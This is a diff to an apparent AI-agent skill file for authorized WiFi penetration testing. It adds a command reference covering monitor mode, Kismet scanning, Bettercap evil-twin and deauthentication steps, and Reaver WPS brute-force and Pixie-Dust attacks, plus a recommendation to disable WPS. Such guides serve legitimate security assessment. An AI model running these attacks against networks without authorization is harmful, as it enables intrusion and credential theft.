@@ -1,14 +1,6 @@
 ---
 name: conducting-wireless-network-penetration-test
-description: 'Conducts authorized wireless network penetration tests to assess the
-  security of WiFi infrastructure by testing for weak encryption protocols, captive
-  portal bypasses, evil twin attacks, WPA2/WPA3 handshake capture, rogue access point
-  detection, and client-side attacks. The tester evaluates wireless authentication,
-  network segmentation, and the effectiveness of wireless intrusion detection systems.
-  Activates for requests involving wireless pentest, WiFi security assessment, WPA2/WPA3
-  testing, or rogue access point detection.
-
-  '
+description: 'Conducts authorized wireless network penetration tests assessing WiFi infrastructure through weak-encryption testing, captive portal bypass, evil twin attacks, WPA2/WPA3 handshake capture, WPA2-Enterprise rogue RADIUS credential capture, rogue access point detection, and post-compromise wireless-to-wired segmentation testing. Use when scoping a full methodology-driven WiFi engagement evaluating authentication, network segmentation, and WIDS/WIPS effectiveness. Do not use for the WPS/Reaver and Kismet command walkthrough of the same wireless pentest - use performing-wifi-password-cracking-with-aircrack.'
 domain: cybersecurity
 subdomain: penetration-testing
 tags:
@@ -111,11 +103,73 @@ After gaining wireless network access, assess network segmentation:
 - Test if wireless-to-wired segmentation is enforced by attempting to access servers on the wired network
 - Document all accessible resources from the wireless network to demonstrate segmentation failures
 
+## Command Reference
+
+The methodology above maps to these concrete commands.
+
+### Monitor-Mode Setup
+
+```bash
+# Identify wireless interfaces
+iwconfig
+airmon-ng
+
+# Kill processes that interfere with monitor mode
+airmon-ng check kill
+
+# Enable monitor mode (interface becomes wlan0mon)
+airmon-ng start wlan0
+
+# Verify
+iwconfig wlan0mon
+```
+
+### Kismet Passive Scanning
+
+Use Kismet for passive discovery and mapping without transmitting (stealthy recon and rogue-AP hunting):
+
+```bash
+# Start Kismet against the monitor interface
+kismet -c wlan0mon
+# Access the web UI at http://localhost:2501
+```
+
+### Bettercap WiFi Module Workflow
+
+```bash
+# Launch Bettercap on the monitor interface
+sudo bettercap -iface wlan0mon
+
+# Within the Bettercap interactive session:
+wifi.recon on        # discover APs and clients
+wifi.show            # list discovered networks
+wifi.ap              # spin up a rogue/evil-twin AP
+# wifi.deauth <BSSID>  # deauthenticate clients from a target AP
+```
+
+### WPS / Reaver Pixie-Dust Attack
+
+Test access points for WPS weaknesses (an often-overlooked path that bypasses PSK strength entirely):
+
+```bash
+# Enumerate WPS-enabled APs and check lock/rate-limit status
+wash -i wlan0mon
+
+# Online WPS PIN brute force (only if WPS enabled and not rate-limited)
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:03 -vv
+
+# Pixie-Dust attack (offline WPS PIN recovery against vulnerable chipsets)
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:03 -K 1 -vv
+```
+
+Flag WPS-enabled access points as a finding: WPS PINs can be recovered offline (Pixie-Dust) or brute-forced, defeating an otherwise strong WPA2 passphrase. Recommend disabling WPS on all APs.
+
 ## Key Concepts
 
 | Term | Definition |
 |------|------------|
 | **Evil Twin** | A rogue access point that mimics a legitimate SSID to trick clients into connecting, enabling man-in-the-middle attacks and credential capture |
+| **WPS Pixie-Dust** | An offline attack that recovers the WPS PIN from a vulnerable AP's weak nonce generation, yielding the WPA2 passphrase without brute-forcing the PSK |
 | **4-Way Handshake** | The WPA2 authentication exchange between client and AP that establishes encryption keys; captured handshakes can be cracked offline |
 | **WPA3-SAE** | Simultaneous Authentication of Equals; WPA3's key exchange protocol that resists offline dictionary attacks and provides forward secrecy |
 | **Transition Mode** | WPA3 backward compatibility mode that supports both WPA2 and WPA3 clients, potentially vulnerable to downgrade attacks |
